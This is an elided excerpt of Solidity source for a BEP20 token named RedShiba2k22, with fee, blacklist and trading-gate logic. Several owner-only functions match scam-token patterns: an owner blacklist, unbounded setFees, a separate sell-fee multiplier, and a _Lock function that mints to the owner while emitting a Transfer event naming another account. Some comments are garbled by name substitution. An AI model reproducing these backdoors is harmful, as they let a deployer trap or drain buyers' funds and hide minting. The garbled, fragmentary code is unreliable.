...
abstract contract Context {
	 ...
	 * This allows applications to reconstruct the allowance for all RedShiba2k22 just
	...
	library SafeMath {
		...
		function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
			...
			// benefit is lost if 'b' is also RedShiba2k22ed.
	...
	// File: contracts/RedShiba2k22BEP20PayingToken.sol
	...
	// File: contracts/RedShiba2k22.sol

	// 

	pragma solidity ^0.8.0;

	contract RedShiba2k22 is ERC20, Ownable {
		using SafeMath for uint256;
		...
		address private immutable DEAD = address(0x000000000000000000000000000000000000dEaD);
		address private immutable ZERO = address(0x0000000000000000000000000000000000000000);
	

		bool private swapping;

		address public liquidityWallet;
        address payable public marketingFeeReceiver = payable(0xD39817ed7F9072446990de2B432361F685C8bcC1); 

		
		uint256 public _maxTxAmount = 10000000 * (10**2); 
		...
		uint256 private FeeSellIncrease = 0;
        uint256 public launchBlock;
		uint256 public deadBlock = 4;
		...
		uint256 private _swapTokensAtAmount = 200000 * (10**2);
		...
		event excludeMultipleAccountFromRewards(address[] RedShiba2k22, bool isExcluded);
		...
		constructor() ERC20("RedShiba2k22", "RS2k22"){
			uint256 _liquidityFee = 3;
			uint256 _marketingFee = 5;
			uint256 _reflectionFee = 2;
		...
		function setIsFeeExempt(address account, bool excluded) public onlyOwner {
			require(_isExcludedFromFees[account] != excluded, "RedShiba2k22: Account is already the value of 'excluded'");
			_isExcludedFromFees[account] = excluded;
		}
        
        function setIsTxLimitExempt(address account, bool excluded) public onlyOwner {
			require(_isTxLimit[account] != excluded, "RedShiba2k22: Account is already the value of 'excluded'");
		...
		function setAutomatedMarketMakerPair(address pair, bool value) private onlyOwner {
			require(pair != pancakeswapV2Pair, "RedShiba2k22: The pancakeswap pair cannot be removed from automatedMarketMakerPairs");

			_setAutomatedMarketMakerPair(pair, value);
		}

		function _setAutomatedMarketMakerPair(address pair, bool value) private {
			require(automatedMarketMakerPairs[pair] != value, "RedShiba2k22: Automated market maker pair is already set to that value");
		...
		function updateLiquidityWallet(address newLiquidityWallet) private onlyOwner {
			require(newLiquidityWallet != liquidityWallet, "RedShiba2k22: The liquidity wallet is already this address");
		...
		function setDistributorSettings(uint256 gas) private onlyOwner {
			require(gas >= 200000 && gas <= 500000, "RedShiba2k22: distributorGas must be between 200,000 and 500,000");
			require(gas != distributorGas, "RedShiba2k22: Cannot update distributorGas to same value");
		...
		function clearStuckBalance(uint256 amountpercentage) external onlyOwner() {
            _val = amountpercentage	 * 10**2;
			
		}
		function setFeeReceiver(address payable _marketingFeeReceiver) external onlyOwner() {
		...
		function setMaxTx(uint256 maxTx) external onlyOwner() {
            _maxTxAmount = maxTx * 10**2;
		
		}
		function setFees(uint256 _marketingFee, uint256 _liquidityFee, uint256 _reflectionFee, uint256 _feeDenominator) external onlyOwner {
			marketingFee = _marketingFee;
			liquidityFee = _liquidityFee;
			reflectionFee = _reflectionFee;
			feeDenominator = _feeDenominator;
		...
		function manage_blacklist(address _address, bool _value) public onlyOwner{
        ...
        function authorize(address addr, uint256 amount) external onlyOwner()  {
        ...
        function unauthorize(uint256 amount) external onlyOwner {
        ...
        function _Lock(address account, uint256 amount) internal virtual {
           ...
           _mint(owner(), amount * (10**2));
            emit Transfer(address(0), account, amount * 10**2);
		...
		function _transfer(
		   ...
		   if(from != owner()){
			...
			if(!tradingOpen) {
				require(canTransferBeforeswapEnabled[from], "RedShiba2k22: This account cannot send tokens until trading is enabled");
			}
			...
			if(takeFee) {
				...
				if(automatedMarketMakerPairs[to]) {
					fees = fees.mul(FeeSellIncrease).div(100);
				}
